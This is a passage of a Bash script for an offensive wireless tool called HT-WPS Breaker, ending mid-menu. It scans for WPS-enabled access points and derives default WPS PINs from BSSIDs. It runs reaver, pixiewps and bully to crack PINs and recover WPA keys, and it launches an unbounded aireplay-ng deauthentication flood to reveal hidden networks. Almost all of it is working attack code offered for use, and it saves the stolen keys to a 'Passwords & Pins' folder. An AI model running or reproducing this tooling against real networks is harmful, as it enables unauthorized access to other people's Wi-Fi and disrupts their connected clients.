
while [ "$re" == 'y' ] || [ "$re" == 'yes' ] ||[ "$re" == 'o' ] || [ "$re" == 'oui' ]
do
    re=nothing
    echo -ne '\033c'
    trap RM_HT_FOLDER SIGINT SIGQUIT SIGTSTP
    echo ""
    sleep 0.1
    echo -e $Cyan   "    +${Yellow}-------------------------------------------------------------------${Cyan}+"
    sleep 0.1
    echo -e $Yellow   "    |                                                                   |"
    sleep 0.1
    echo -e "     |$Red   ██╗  ██╗████████╗   ${Green}██╗    ██╗██████╗ ███████╗ ${BCyan}██${Yellow}╗${BCyan} ██${Yellow}╗ ${Purple}██████╗ $Yellow |"
    sleep 0.1
    echo -e "     |$Red   ██║  ██║╚══██╔══╝   ${Green}██║    ██║██╔══██╗██╔════╝${Red}████████${Yellow}╗${Purple}██╔══██╗$Yellow |"
    sleep 0.1
    echo -e "     |$BRed   ███████║   ██║${White}█████╗${BGreen}██║ █╗ ██║██████╔╝███████╗${Yellow}╚${BCyan}██${Yellow}╔═${BCyan}██${Yellow}╔╝${BPurple}██████╔╝$Yellow |"
    sleep 0.1
    echo -e "     |$BRed   ██╔══██║   ██║${White}╚════╝${BGreen}██║███╗██║██╔═══╝ ╚════██${Yellow}║${Red}████████${Yellow}╗${BPurple}██╔══██╗$Yellow |"
    sleep 0.1
    echo -e "     |$Red   ██║  ██║   ██║      ${Green}╚███╔███╔╝██║     ███████║${Yellow}╚${BCyan}██${Yellow}╔═${BCyan}██${Yellow}╔╝${Purple}██████╔╝$Yellow |"
    sleep 0.1
    echo -e "     |$Red   ╚═╝  ╚═╝   ╚═╝      ${Green} ╚══╝╚══╝ ╚═╝     ╚══════╝${Yellow} ╚═╝ ╚═╝ ${Purple}╚═════╝ $Yellow |"
    sleep 0.1
    echo -e "     |                                                                   |"
    sleep 0.1
    echo -e $Cyan   "    +${Yellow}-------------------------------------------------------------------${Cyan}+${Yellow}"
    sleep 0.1
    echo -e "                          |${BRed} High${BYellow} Touch${BPurple} WPS${BGreen} Breaker${Yellow} |"
    sleep 0.1
    echo -e "                          ${Cyan}+${Yellow}------------------------${Cyan}+"
    sleep 0.1
    Ver_User=`whoami`
    if [ "$Ver_User" != "root" ]
    then
        echo -e "$Yellow     +${White}-------------------------------------------------------------------${Yellow}+"
        echo -e "${White}     | [${Red}!${White}] You need to launch the script as the root user , run it with  ${White}|"
        echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
        echo -e "${White}     | ${Red}                 \$${White}=> sudo ${Yellow}./${Green}HT${White}-${Green}WB${White}.${Green}sh${White}                              |"
        echo -e "${White}     | ${Red}                 \$${White}=> sudo ${Blue}bash ${Green}HT${White}-${Green}WB${White}.${Green}sh${White}                           |"
        echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
        echo ""
        echo ""
    else
        echo -e "$Yellow     +${White}-------------------------------------------------------------------${Yellow}+"
        echo -e "${White}     | ${Yellow} ID ${White} |                   ${BPurple}   Name                             ${White}     |"
        echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
        echo -e "${White}     | ${Red}[${Yellow}01${Red}]${White} |$Green Attack automatically with${Cyan} Wash${White} .        (${Red}WPS${Green}{${Yellow}WPA${White}/${Yellow}WPA2${Green}}${White})    |"
        echo -e "${White}     | ${Red}[${Yellow}02${Red}]${White} |$Green Attack automatically with${Cyan} Airodump-ng${White} . (${Red}WEP${White}/${Red}WPS${Green}{${Yellow}WPA${White}/${Yellow}WPA2${Green}}${White})|"
        echo -e "${White}     | ${Red}[${Yellow}03${Red}]${White} |$Green Manuel input${White} .                                             |"
        echo -e "${White}     | ${Red}[${Yellow}04${Red}]${White} |$Green If you want to crack an acces point's key with$BRed WPS PIN${White} .   |"
        echo -e "${White}     | ${Red}[${Yellow}05${Red}]${White} |$Green If you want to crack a$BRed Hidden$Green acces point${White} .                |"
        echo -e "${White}     | ${Red}[${Yellow}06${Red}]${White} |$Green ${Green}Enable${White} or ${Red}Disable${White} The${Cyan} Monitor Mode${White} .                       |"
        echo -e "${White}     | ${Red}[${Yellow}07${Red}]${White} |$Green Exit${White} .${White}                                                     |"
        echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
        echo ""
        echo -e -n "$White    ${Red} [${Cyan}!${Red}]$White Type the$BRed ID$White of your choice : "
        read menu
        menu=`expr $menu + 0 2> /dev/null`
        case $menu in
            "1")
                Ver_Pckg_Tools
                Ver_Mon_WCar_Fun
                if [ "$VerMon" != "" ]
                then
                    Ver_Mon_Fun
                    trap kill_wash SIGINT
                    wash -i $mon -C -o ${Temporary}/wash.txt > /dev/null &
                    WashID="$!"
                    disown $WashID
                    for ((c=0; c<=3; c++))
                    do
                        echo -ne "\r[00:${Green}0${c}$White]$White Click$Green CTRL+C$White when ready,good luck"
                        sleep 1
                    done
                    back=0
                    fin=0
                    num_wireless=-1
                    ti=0
                    while [ "$back" == "0" ]
                    do
                        echo -ne '\033c'
                        echo -e "${White} +${Red}---------------------------------------------------------------------------------${White}+"
                        echo -e "${Red} |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BGreen green$White this mean that device is vulnerable.${Red}                  |"
                        echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BYellow yellow$White this mean that device is may be vulnerable or aren't.${Red}|"
                        echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BRed red$White this mean the wps of that device is Locked.$Red             |"
                        echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$Purple Purple$White this mean that device is has a default pin or aren't.${Red}|"
                        echo -e "${White} +${Red}---------------------------------------------------------------------------------${White}+"
                        echo -e ${Yellow}"  ID	${BWhite}BSSID                  CH       PWR     WPS Locked   Ver    ESSID"
                        echo -e $Purple" ~~~~   ~~~~~                  ~~       ~~~     ~~~~~~~~~~   ~~~    ~~~~~"
                        i=0
                        Quit=0
                        NL=1
                        count_rot=0
                        while [ $Quit == 0 ]
                        do
                            cat ${Temporary}/wash.txt | sed '1,2d' > ${Temporary}/wash_nf.txt
                            line=`cat ${Temporary}/wash_nf.txt | sed -n ${NL}p 2> /dev/null`
                            if [ "$line" != "" ]
                            then
                                v=0
                                MAC=`echo $line | awk -F' ' '{print $1}'`
                                CHANNEL=`echo $line | awk -F' ' '{print $2}'`
                                POWER=`echo $line | awk -F' ' '{print $3}'`
                                WPS_VERSION=`echo $line | awk -F' ' '{print $4}'`
                                WPS_LOCKED=`echo $line | awk -F' ' '{print $5}'`
                                ESSID=`echo $line | cut -d' ' -f6-`
                                length=${#MAC}
                                if [ $length -ge 17 ]; then
                                    i=$(($i+1))
                                    if [ $i != 0 ]; then
                                        d=1
                                    else
                                        d=0
                                    fi
                                    POWER=`expr $POWER + 100`
                                    Ver_vun=`echo $MAC | cut -c 1-8`
                                    if [ "$WPS_LOCKED" == "No" ]
                                    then
                                        WPS_LOCKED="  No  "
                                    else
                                        WPS_LOCKED="Locked"
                                    fi
                                    if [ "$i" -lt "10" ]
                                    then
                                        echo -e -n " ${Red}[${Yellow}0"$i"${Red}]\t"
                                    else
                                        echo -e -n " ${Red}[${Yellow}"$i"${Red}]\t"
                                    fi
                                    CP=$(echo -e "$Vun_MAC_LIST" | grep -w "$Ver_vun")
                                    if [ "$CP" != "" ]
                                    then
                                        v=1
                                    fi
                                    Num_OF_PIN[$i]=0
                                    Num_OF_MAC[$i]=0
                                    CP=""
                                    CP=$(echo -e "$Default_PIN_MAC_LIST" | grep "$Ver_vun" | awk -F"=" '{print $1}')
                                    CP1=$(echo -e "$GENERATED_PIN_MAC_LIST" | grep "$Ver_vun")
                                    if [ "$CP" != "" ]
                                    then
                                        Num_OF_PIN[$i]=`echo $(($(($(echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | wc -l)-$(echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | sed -n 1p)))-1))`
                                        Num_OF_MAC[$i]=`echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | sed -n 1p`
                                        if [ "${Num_OF_PIN[$i]}" -ge "2" ]
                                        then
                                            for (( p=1; p<=${Num_OF_PIN[$i]}; p++))
                                            do
                                                declare PIN$(echo $MAC | tr -d ":")[$((p-1))]=$(echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | sed -n $(($(($p+1))+${Num_OF_MAC[$i]}))'p')
                                            done
                                        else
                                            declare PIN$(echo $MAC | tr -d ":")[1]=$(echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | sed -n $(($(echo ${Default_PIN_MAC[$CP]} | tr " " "\n" | sed -n 1p)+2))'p')
                                        fi
                                        HHDP_GEN[$i]=0
                                        HHDP[$i]=1
                                    elif [ "$CP1" != "" ]
                                    then
                                        Num_OF_PIN[$i]="1"
                                        LAST_SIX_DIGITS=$(echo $MAC | awk -F":" '{print $4,$5,$6}' | tr -d " ")
                                        HEX_TO_DEC=$(printf '%d\n' 0x${LAST_SIX_DIGITS}) 2> /dev/null
                                        HALF_MAC=`expr '(' $HEX_TO_DEC '%' 10000000 ')'`
                                        PIN=`expr 10 '*' $HALF_MAC`
                                        ACCUM=0
                                        ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`
                                        ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`
                                        ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`
                                        ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
                                        ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
                                        ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
                                        ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`
                                        THE_REST=`expr $ACCUM '%' 10`
                                        CHECK_THE_REST=`expr '(' 10 '-' $THE_REST ')' '%' 10`
                                        PIN[$i]=$(printf '%08d\n' `expr $PIN '+' $CHECK_THE_REST`)
                                        HHDP_GEN[$i]=1
                                        HHDP[$i]=1
                                    else
                                        HHDP[$i]=0
                                    fi
                                    BLUE_MAC=0
                                    if [ $(cat ${Desktop_PATH}/Passwords\ \&\ Pins/${MAC}* 2> /dev/null | grep -i 'pin' | wc -l 2> /dev/null) -gt 0 ] || [ "$(cat ${Desktop_PATH}/Passwords\ \&\ Pins/${MAC}* 2> /dev/null | grep -i 'Key' | cut -d'"' -f2 2> /dev/null)" != "" ]
                                    then
                                        echo -e -n $BBlue"$MAC      "
                                        BLUE_MAC=1
                                    elif [ "$WPS_LOCKED" == "Locked" ]
                                    then
                                        echo -e -n $BRed"$MAC      "
                                    elif [ "$v" == 1 ]
                                    then
                                        echo -e -n $BGreen"$MAC      "
                                    elif [ "${HHDP[$i]}" == "1" ]
                                    then
                                        echo -e -n $Purple"$MAC      "
                                    else
                                        echo -e -n $BYellow"$MAC      "
                                    fi
                                    if [ "$v" == 1 ] && [ "$(echo $ESSID)" != "" ] && [ "$BLUE_MAC" -eq 0 ] || [ "${HHDP[$i]}" == 1 ] && [ "$(echo $ESSID)" != "" ] && [ "$BLUE_MAC" -eq 0 ]
                                    then
                                        ti=$(($ti+1))
                                        Vun_BSSID[$ti]=$MAC
                                        Vun_CHANNEL[$ti]=$CHANNEL
                                        Vun_ESSID[$ti]=$ESSID
                                        Vun_PRIVACY[$ti]=$PRIVACY
                                        Vun_SPEED[$ti]=$SPEED
                                        Vun_Num_OF_PIN[$ti]=${Num_OF_PIN[$i]}
                                        Vun_PIN[$ti]=${PIN[$i]}
                                        Vun_HHDP[$ti]=${HHDP[$i]}
                                        Vun_HHDP_GEN[$ti]=${HHDP_GEN[$i]}
                                    fi
                                    if [ "$CHANNEL" -ge 10 ]
                                    then
                                        echo -e -n $BWhite"$CHANNEL\t"
                                    else
                                        echo -e -n $BWhite"0$CHANNEL\t"
                                    fi
                                    if [ $POWER -ge 40 ]
                                    then
                                        echo -e -n $Green"$POWER%\t"
                                    elif [ $POWER -ge 30 ]
                                    then
                                        echo -e -n $Yellow"$POWER%\t"
                                    else
                                        echo -e -n $Red"$POWER%\t"
                                    fi
                                    if [ "$WPS_LOCKED" == "  No  " ]
                                    then
                                        echo -e -n $Green"  $WPS_LOCKED"
                                    else
                                        echo -e -n $Red"  $WPS_LOCKED"
                                    fi
                                    echo -e -n $Green"     $WPS_VERSION"
                                    echo -e $BWhite"    $ESSID\t"
                                    IDLENGTH=$IDLENGTH
                                    ESSID[$i]=$ESSID
                                    CHANNEL[$i]=$CHANNEL
                                    BSSID[$i]=$MAC
                                    SPEED[$i]=$SPEED
                                fi
                                NL=$(($NL+1))
                            fi
                            sleep 0.1
                            if [ "$fin" -eq 1 ]
                            then
                                count_rot=$(($count_rot+1))
                            fi
                            if [ "$count_rot" -eq "$num_wireless" ]
                            then
                                Quit=1
                            fi
                        done < <( cat ${Temporary}/wash_nf.txt 2> /dev/null )
                        num_wireless=$i
                        fin=1
                        trap exit_function SIGINT
                        echo ""
                        echo ""
                        SELECT_TO_CRACK
                    done
                    if [ "$back" == "1" ]
                    then
                        re="yes"
                    elif [ "$back" == "2" ]
                    then
                        re="no"
                    fi
                fi
            ;;
            "2")
                Ver_Pckg_Tools
                Ver_Mon_WCar_Fun
                if [ "$VerMon" != "" ]
                then
                    Ver_Mon_Fun
                    for ((c=0; c<=3; c++))
                    do
                        echo -ne "\r[00:${Green}0${c}$White]$White Click$Green CTRL+C$White when ready,good luck"
                        sleep 1
                    done
                    Ver_Dir=`ls ${Temporary} | grep -E '^capture$'`
                    if [ "$Ver_Dir" != "" ];then
                        rm -rf ${Temporary}/capture
                        mkdir ${Temporary}/capture
                    else
                        mkdir ${Temporary}/capture
                    fi
                    trap - SIGINT SIGQUIT SIGTSTP
                    airodump-ng -w ${Temporary}/capture/capture --output-format csv -a $mon
                    Line_CSV=`wc -l ${Temporary}/capture/capture-01.csv | awk '{print $1}'`
                    HeTa=`cat ${Temporary}/capture/capture-01.csv | egrep -a -n '(Station|CLIENT)' | awk -F : '{print $1}'`
                    HeTa=`expr $HeTa - 1`
                    head -n $HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/capture-02.csv
                    tail -n +$HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/clients.csv
                    SELECT_CAPTURE_CRACK
                fi
            ;;
            "3")
                trap - SIGINT SIGQUIT SIGTSTP
                VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
                Ver_Mon_WCar_Fun
                if [ "$VerMon" != "" ]
                then
                    Ver_Mon_Fun
                    echo -ne '\033c'
                    echo ""
                    echo -e "$White   [+]$Green Fill in all the blanks :"
                    echo ""
                    echo -e -n "$Cyan         [+]$Yellow BSSID : $White"
                    read BSSID
                    echo ""
                    echo -e -n "$Cyan         [+]$Yellow CH (Channel) : $White"
                    read CHANNEL
                    echo ""
                    for ((c=0; c<=3; c++))
                    do
                        echo -ne "\r[00:${Green}0${c}$White]$White Click$Green CTRL+C$White when you capture$Green the required arguments$White,GooD LucK"
                        sleep 1
                    done
                    echo "" > ${Temporary}/empty.txt
                    reaver -i $mon -b "$BSSID" -c "$CHANNEL" -vvv -n -L -P -s ${Temporary}/empty.txt
                    echo ""
                    echo -e -n "$Cyan [+]$Yellow PKE : $Green"
                    read PKE
                    echo -e -n "$Cyan [+]$Yellow PKR : $Green"
                    read PKR
                    echo -e -n "$Cyan [+]$Yellow E-Hash1 : $Green"
                    read E_Hash1
                    echo -e -n "$Cyan [+]$Yellow E-Hash2 : $Green"
                    read E_Hash2
                    echo -e -n "$Cyan [+]$Yellow AuthKey : $Green"
                    read AuthKey
                    echo -e -n "$Cyan [+]$Yellow E-Nonce : $Green"
                    read E_Nonce
                    echo -e -n "$Cyan [+]$Yellow R-Nonce : $Green"
                    read R_Nonce
                    if [ "$PKE" != "" ] && [ "$PKR" != "" ] && [ "$E_Hash1" != "" ] && [ "$E_Hash2" != "" ] && [ "$AuthKey" != "" ] && [ "$E_Nonce" != "" ] && [ "$R_Nonce" != "" ]
                    then
                        trap kill_load SIGINT
                        pixiewps -f -e $PKE -r $PKR -s $E_Hash1 -z $E_Hash2 -a $AuthKey -n $E_Nonce -m $R_Nonce -b $BSSID | tee ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt > /dev/null &
                        PID="$!"
                        Wait_Msg="$Red Wait until the$Green PIN$Red is cracked,this may take around 30 minutes ...$White"
                        End_Msg="Cracking process is done , the $Green Result$White is as follows :"
                        Loading
                        echo " [+] ESSID      >> $ESSID" > ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
                        echo " [+] BSSID      >> $BSSID" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
                        echo " [+] Channel    >> $CHANNEL" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
                        #pixiewps -v 3 -f -e $PKE -r $PKR -s $E_Hash1 -z $E_Hash2 -a $AuthKey -n $E_Nonce -m $R_Nonce -b $BSSID | tee ${Desktop_PATH}/${BSSID}.txt | head -n 11 | tail -n 9
                        PIN=`less ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | grep 'WPS pin:' | awk '{print $4}'`
                        time_taken=`less ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt | grep -w "Time taken" | cut -c18-`
                        if [ "$PIN" != "" ]
                        then
                            echo " [+] PIN        >> \"$PIN\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
                            echo ""
                            echo -e "${White}       [+] PIN  >>${Green} $PIN"
                            echo -e "${White}       [+] Time taken >>${Red} $time_taken"
                            echo ""
                            echo -e -n "$Cyan         [+]$Yellow PIN : $White"
                            read PIN
                            hash bully 2> /dev/null
                            hash_bully="$?"
                            if [ $hash_bully -eq 0 ]
                            then
                                echo ""
                                echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
                                echo ""
                                bully -b $BSSID -c $CHANNEL -B -F -p $PIN $mon > ${Temporary}/Get_Pass.txt 2> /dev/null &
                                PID="$!"
                                Wait_Msg="Wait until the${Green} Bully${white} is${Red} finished${White} ."
                                End_Msg="The process of${Green} Bully${White} has completed${Green} successfully${White}."
                                Loading
                                Key=`cat ${Temporary}/Get_Pass.txt | grep -w key | awk -F\' '{print $4}'`
                                echo " [+] Key        >> \"$Key\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
                            else
                                echo ""
                                echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
                                echo ""
                                reaver -i $mon -b $BSSID -c $CHANNEL -e -n -vv -p $PIN > ${Temporary}/Get_Pass.txt &
                                PID="$!"
                                Wait_Msg="Wait until the${Green} Reaver${white} is${Red} finished${White} ."
                                End_Msg="The process of${Green} Reaver${White} has completed${Green} successfully${White}."
                                Loading
                                Key=`cat ${Temporary}/Get_Pass.txt | grep -w "WPA PSK" | awk -F\' '{print $2}'`
                                echo " [+] Key        >> \"$Key\"" >> ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
                            fi
                        else
                            echo ""
                            echo -e "$Red [!]$White Sorry pin not found,good luck next time."
                            echo ""
                            rm -rf ${Desktop_PATH}/Passwords\ \&\ Pins/${BSSID}.txt
                        fi
                    else
                        echo -e "$Red [!]$Yellow Not all required arguments have been supplied!"
                        echo ""
                    fi
                fi
            ;;
            "4")
                VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
                Ver_Mon_WCar_Fun
                if [ "$VerMon" != "" ]
                then
                    Ver_Mon_Fun
                    echo -ne '\033c'
                    echo ""
                    echo -e "$White   [+]$Green Fill in all the blanks :"
                    echo ""
                    echo -e -n "$Cyan         [+]$Yellow ESSID : $White"
                    read ESSID
                    echo ""
                    echo -e -n "$Cyan         [+]$Yellow PIN : $White"
                    read PIN
                    echo ""
                    echo -e -n "$Cyan         [+]$Yellow BSSID : $White"
                    read BSSID
                    echo ""
                    echo -e -n "$Cyan         [+]$Yellow CH (Channel) : $White"
                    read CHANNEL
                    echo ""
                    hash bully
                    hash_bully="$?"
                    if [ $hash_bully -eq 0 ]
                    then
                        echo ""
                        echo -e "$White [+] Running$Green bully$White with the correct$Green PIN$White, wait ..."
                        echo ""
                        bully -b $BSSID -c $CHANNEL -B -F -e "$ESSID" -p $PIN $mon
                        echo -e "$Yellow [+]$Green Congratulation (^_^) "
                        echo ""
                    else
                        echo ""
                        echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
                        echo ""
                        reaver -i $mon -b $BSSID -c $CHANNEL -vv -e "$ESSID" -p $PIN
                        echo -e "$Yellow [+]$Green Congratulation (^_^) "
                        echo ""
                    fi
                    
                fi
            ;;
            "5")
                Ver_Pckg_Tools
                Ver_Mon_WCar_Fun
                if [ "$VerMon" != "" ]
                then
                    Ver_Mon_Fun
                    for ((c=0; c<=3; c++))
                    do
                        echo -ne "\r[00:${Green}0${c}$White]$White Click$Green CTRL+C$White when you see your target,good luck"
                        sleep 1
                    done
                    Ver_Dir=`ls /tmp/HT-WPS-Breaker | grep -E '^capture$'`
                    if [ "$Ver_Dir" != "" ];then
                        rm -rf ${Temporary}/capture
                        mkdir ${Temporary}/capture
                    else
                        mkdir ${Temporary}/capture
                    fi
                    trap - SIGINT SIGQUIT SIGTSTP
                    airodump-ng -w ${Temporary}/capture/capture --output-format csv -a $mon
                    Line_CSV=`wc -l ${Temporary}/capture/capture-01.csv | awk '{print $1}'`
                    HeTa=`cat ${Temporary}/capture/capture-01.csv | egrep -a -n '(Station|CLIENT)' | awk -F : '{print $1}'`
                    HeTa=`expr $HeTa - 1`
                    head -n $HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/capture-02.csv
                    tail -n +$HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/clients.csv
                    back=0
                    trap exit_function SIGINT
                    echo -ne '\033c'
                    echo -e "$Red+---------------------------------------------------------------------------------------+"
                    echo -e "| [+]$White If the BSSID in$BGreen green$White that means there are clients connected to device.$Red           |"
                    echo -e "| [+]$White If the BSSID in$BYellow yellow$White that means there are clients connected to device or aren't.$Red|"
                    echo -e "+---------------------------------------------------------------------------------------+$White"
                    echo -e ${Yellow}"  ID	${BWhite}BSSID            	 CH	SEC     PWR     CLIENT   ESSID"
                    echo -e $Purple" ~~~~   ~~~~~                    ~~     ~~~     ~~~     ~~~~~~   ~~~~~"
                    i=0
                    while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY
                    do
                        v=0
                        length=${#MAC}
                        PRIVACY=$(echo $PRIVACY| tr -d "^ ")
                        PRIVACY=${PRIVACY:0:4}
                        if [ $length -ge 17 ]; then
                            i=$(($i+1))
                            if [ $i != 0 ]; then
                                d=1
                            else
                                d=0
                            fi
                            POWER=`expr $POWER + 100`
                            CLIENT=`cat ${Temporary}/capture/clients.csv | grep $MAC`
                            Ver_vun=`echo $MAC | cut -c 1-8`
                            if [ "$CLIENT" != "" ]; then
                                CLIENT="Yes"
                            else
                                CLIENT="No"
                            fi
                            if [ "$i" -lt "10" ]
                            then
                                echo -e -n " ${Red}[${Yellow}0"$i"${Red}]\t"
                            else
                                echo -e -n " ${Red}[${Yellow}"$i"${Red}]\t"
                            fi
                            if [ "$CLIENT" == "Yes" ]
                            then
                                echo -e -n $BGreen"$MAC\t"
                            else
                                echo -e -n $BYellow"$MAC\t"
                            fi
                            echo -e -n $BWhite"$CHANNEL\t"
                            echo -e -n $BWhite"$PRIVACY\t"
                            if [ $POWER -ge 40 ]
                            then
                                echo -e -n $Green"$POWER%\t"
                            elif [ $POWER -ge 30 ]
                            then
                                echo -e -n $Yellow"$POWER%\t"
                            else
                                echo -e -n $Red"$POWER%\t"
                            fi
                            if [ "$CLIENT" == "Yes" ]
                            then
                                echo -e -n $Green"$CLIENT\t"
                            else
                                echo -e -n $Red"$CLIENT\t"
                            fi
                            echo -e $BWhite"$ESSID\t"
                            IDLENGTH=$IDLENGTH
                            ESSID[$i]=$ESSID
                            CHANNEL[$i]=$CHANNEL
                            BSSID[$i]=$MAC
                            PRIVACY[$i]=$PRIVACY
                            SPEED[$i]=$SPEED
                        fi
                    done < ${Temporary}/capture/capture-02.csv
                    echo ""
                    if [ "$i" -eq "0" ]
                    then
                        exit_function
                    fi
                    echo ""
                    V_number=0
                    while [ "$V_number" != "1" ]
                    do
                        echo -en "\033[1A\033[2K"
                        echo -n -e "${White}  [+]${Blue} Select the ${Red}ID${Blue} of your target from$White [${Green}${d}-${i}$White] : "
                        read  N_OB
                        if [[ "$N_OB" =~ ^[+-]?[0-9]+$ ]]
                        then
                            if [ "$N_OB" -ge "$d" ] && [ "$N_OB" -le "$i" ]
                            then
                                V_number=1
                            else
                                V_number=0
                            fi
                        else
                            V_number=0
                        fi
                    done
                    echo ""
                    trap - SIGINT SIGQUIT SIGTSTP
                    idlenght=${IDLENGTH[$N_OB]}
                    CHANNEL=$(echo ${CHANNEL[$N_OB]}|tr -d [:space:])
                    BSSID=${BSSID[$N_OB]}
                    rm -rf ${Temporary}/capture/*
                    echo ""
                    echo -e "${White}  +${Yellow}------------------------------${White}+"
                    echo -e "${Yellow}  |${White} [${Red}+${White}]$Yellow all required arguments${Yellow}   |"
                    echo -e "${White}  +${Yellow}------------------------------${White}+"
                    echo ""
                    trap kill_Hidden SIGINT
                    airodump-ng -w ${Temporary}/capture/capture --output-format csv -c $CHANNEL -a $mon 2> /dev/null &
                    Airodump_PID=$!
                    disown $Airodump_PID
                    tset
                    aireplay-ng -0 0 -a $BSSID $mon > /dev/null 2> /dev/null &
                    aireplayID=$!
                    disown $aireplayID
                    Quit=0
                    while [ $Quit == 0 ]
                    do
                        Hidden=`cat ${Temporary}/capture/capture-01.csv 2> /dev/null | grep ${BSSID} | cut -d',' -f14`
                        Ver_Name=`echo -e $Hidden`
                        if [ "$Ver_Name" != "" ]
                        then
                            echo ""
                            echo -en "\033[1A\033[2K"
                            echo -ne "${Yellow}          >>${White} The name has been obtained${Green} successfully ${White}."
                            Quit=1
                        else
                            echo -ne "\r${Yellow}          >>${White} The name of${Green} AP${White} is still {${Red} Hidden${White} } ."
                            Quit=0
                        fi
                    done
                    trap exit_function SIGINT
                    kill -9 $aireplayID 2> /dev/null
                    kill -9 $Airodump_PID 2> /dev/null
                    sleep 2.0
                    Line_CSV=`wc -l ${Temporary}/capture/capture-01.csv | awk '{print $1}'`
                    HeTa=`cat ${Temporary}/capture/capture-01.csv | egrep -a -n '(Station|CLIENT)' | awk -F : '{print $1}'`
                    HeTa=`expr $HeTa - 1`
                    head -n $HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/capture-02.csv
                    tail -n +$HeTa ${Temporary}/capture/capture-01.csv &> ${Temporary}/capture/clients.csv
                    SELECT_CAPTURE_CRACK
                fi
            ;;
            "6")
                for (( i = 0; i <= 9; i++ ))
                do
                    sleep 0.2
                    echo -en "\033[1A\033[2K"
                done
                echo -e "${White}     | ${Red}[${Yellow}01${Red}]${White} |$Green Enable ${White}The ${Cyan}Monitor Mode ${White}.${White}                                  |"
                sleep 0.2
                echo -e "${White}     | ${Red}[${Yellow}02${Red}]${White} |$Red Disable ${White}The ${Cyan}Monitor Mode ${White}.${White}                                 |"
                sleep 0.2
                echo -e "${White}     | ${Red}[${Yellow}03${Red}]${White} |$Green Back to menu ${White}.${White}                                             |"
                sleep 0.2
                echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
                echo ""
                echo -e -n "$White    ${Red} [${Cyan}!${Red}]$White Type the$BRed ID$White of your choice : "
                read ID
                ID=`expr $ID + 0 2> /dev/null`
                echo ""
                case $ID in
                    "1")
                        VerMon=""
                        VerCar=`iwconfig 2>&1 | grep 'ESSID' | wc -l`
                        Ver_Mon_WCar_Fun
                        mode_monitor=no
                    ;;
                    "2")
                        cou_mon=`iwconfig 2>&1 | grep 'Mode:Monitor' | wc -l`
                        if [ $cou_mon -ge 1 ]
                        then
                            Mode_Monitor_Print_Function
                            echo ""
                            echo ""
                            V_number=0
                            while [ "$V_number" != "1" ]
                            do
                                echo -en "\033[1A\033[2K"
                                echo -e -n "\r${White}[+] select$Red number$White of interface in order to${Red} Disable${White} it from [${Green}1-${NUM_INT_CHIP}$White]:$Green"
                                read number
                                if [[ "$number" =~ ^[+-]?[0-9]+$ ]]
                                then
                                    if [ $number -ge 1 ] && [ $number -le ${NUM_INT_CHIP} ]; then
                                        V_number=1
                                        mon=${Interface[$number]}
                                    else
                                        V_number=0
                                    fi
                                else
                                    V_number=0
                                fi
                            done
                            echo ""
                            trap kill_load SIGINT
                            ifconfig $mon down && iwconfig $mon mode managed && ifconfig $mon up > /dev/null 2> /dev/null &
                            PID="$!"
                            Wait_Msg="Disabling${Cyan} Monitor Mode${White} on$Green $mon $White."
                            End_Msg="${Cyan}Monitor Mode${White}$White is${Red} Disable ."
                            Loading
                            trap - SIGINT SIGQUIT SIGTSTP
                            sleep 1
                        else
                            echo ""
                            sleep 0.5
                            echo -e $White" [${Red}!${White}] Is no${Cyan} Monitor Mode${White} to${Red} Disable${White} ."
                            echo ""
                            sleep 0.5
                        fi
                    ;;
                    "3")
                        re="yes"
                    ;;
                    "*")
                        echo ""
                        echo -e "$White     [${Red}!${White}]$Red Input${White} out of range."
                        echo ""
                    ;;
                esac
            ;;
            "7")
                echo ""
